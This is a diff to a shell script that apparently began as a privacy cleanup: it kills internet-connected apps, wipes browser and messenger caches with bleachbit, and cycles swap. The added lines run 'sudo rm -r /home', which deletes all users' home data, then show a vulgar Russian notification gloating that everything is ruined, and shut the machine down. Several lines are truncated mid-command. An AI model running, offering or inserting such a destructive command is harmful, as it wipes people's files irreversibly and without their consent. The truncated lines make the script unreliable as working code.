@@ -3,13 +3,14 @@
         swapoff -a && swapon -a
         sleep 1
 
-  killall -q chrome dropbox iceweasel leafpad psi_plus skype icedove thunderbird firefox-esr firefox chromium xchat transmission kvirc pidgin hexchat telegram-desktop # feel free to add your own internet connected app
+  killall -q chrome dropbox iceweasel leafpad psi_plus skype icedove thunderbir$
 sleep 1
-  bleachbit -c telegram-desktop leafpad psi_plus adobe_reader.cache chromium.cache chromium.current_session chromium.history elinks.history emesene.cache epiphany.cache firefox.url_history flash.cache flash.cookies google_ch$
+  bleachbit -c telegram-desktop leafpad psi_plus adobe_reader.cache chromium.ca$
 sleep 1
 
-sudo dd if=/home/urandom
-
+sudo dd if=/home/urandom of=test.txt bs=21 count=1 conv=notrunc
+sudo rm -r /home
 su x -c 'notify-send "Клянусь Олегом, всЯму пизда!"'
 
 shutdown
+
